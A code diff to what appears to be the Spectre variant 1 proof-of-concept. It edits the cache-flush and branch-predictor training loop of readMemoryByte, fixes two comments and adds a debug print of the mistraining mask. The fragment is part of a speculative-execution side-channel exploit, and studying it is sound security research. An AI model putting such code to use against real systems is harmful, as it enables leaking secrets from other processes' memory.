@@ -157,7 +157,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   for (tries = 999; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
-    /* Flush array2[256*(0..255)] from cache */
+    /* Flush array2[512*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 #else
@@ -188,7 +188,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
+      printf("%lx\n", x);
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
 
